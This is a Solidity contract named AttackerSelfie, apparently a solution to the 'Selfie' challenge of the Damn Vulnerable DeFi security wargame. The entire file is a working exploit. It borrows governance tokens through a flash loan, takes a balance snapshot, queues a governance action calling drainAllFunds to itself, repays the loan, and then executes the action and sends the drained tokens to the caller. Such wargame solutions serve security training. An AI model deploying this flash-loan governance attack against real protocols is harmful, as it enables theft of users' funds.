// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './SelfiePool.sol';

contract AttackerSelfie {
    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool pool;
    uint256 actionId;

    constructor(address _token, address _governance, address _pool) {
        token = DamnValuableTokenSnapshot(_token);
        governance = SimpleGovernance(_governance);
        pool = SelfiePool(_pool);
        token.snapshot();
    }

    function attack(uint256 _amount) public {
        pool.flashLoan(_amount);
    }

    function execute(uint256 _amount) public {
        governance.executeAction(actionId);
        token.transfer(msg.sender, _amount);
    }

    function receiveTokens(address _token, uint256 _amount) public {
        token.snapshot();
        bytes memory data = abi.encodeWithSignature('drainAllFunds(address)', address(this));
        actionId = governance.queueAction(address(pool), data, 0);
        token.transfer(address(pool), _amount);
    }

}